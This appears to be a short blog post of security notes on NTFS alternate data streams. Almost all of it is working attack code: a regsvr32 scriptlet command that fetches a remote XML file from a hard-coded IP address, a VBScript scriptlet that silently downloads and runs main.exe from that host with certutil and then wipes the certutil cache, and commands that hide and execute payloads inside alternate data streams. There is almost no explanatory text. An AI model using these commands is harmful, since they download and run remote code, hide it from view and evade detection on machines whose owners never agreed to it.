---
author: XhstormR
tags:
- security
date: 2019-09-30T19:31:07+08:00
title: Alternate Data Stream
---

<!--more-->

Updated on 2019-09-30

```bash
regsvr32.exe /s /u /i:http://47.98.135.65/main/main.xml scrobj.dll
```

```bash
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:http://47.98.135.65/main/main.xml ^scrobj.dll > ...:payload.bat

cmd.exe - < ...:payload.bat
```

## main.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<scriptlet>
<registration classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
<script language="VBScript">
    <![CDATA[
        CreateObject("WScript.Shell").Run _
            "%ComSpec% /c cd /d %TEMP% && " &_
            "(IF NOT EXIST main.exe certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe) && " &_
            "certutil.exe -urlcache * delete & " &_
            "main.exe r", 0, false
    ]]>
</script>
</registration>
</scriptlet>
```

## delete.bat
```bash
del /f /a /q \\?\%1
rd /s /q \\?\%1
```

---

```bash
type cmd.exe > ...:cmd.exe
wmic process call create D:\Download\...:cmd.exe
```

```bash
echo winver > ...:run.txt
cmd.exe - < ...:run.txt
or
echo WScript.CreateObject("WScript.Shell").Run "cmd /c for /f ""delims=,"" %i in (...:run.txt) do %i", 0 > ...:run.vbs
cscript ...:run.vbs
```

## Reference
* https://ss64.com/vb/shell.html
* https://attack.mitre.org/techniques/T1117/
* https://docs.microsoft.com/zh-cn/dotnet/visual-basic/programming-guide/program-structure/how-to-break-and-combine-statements-in-code
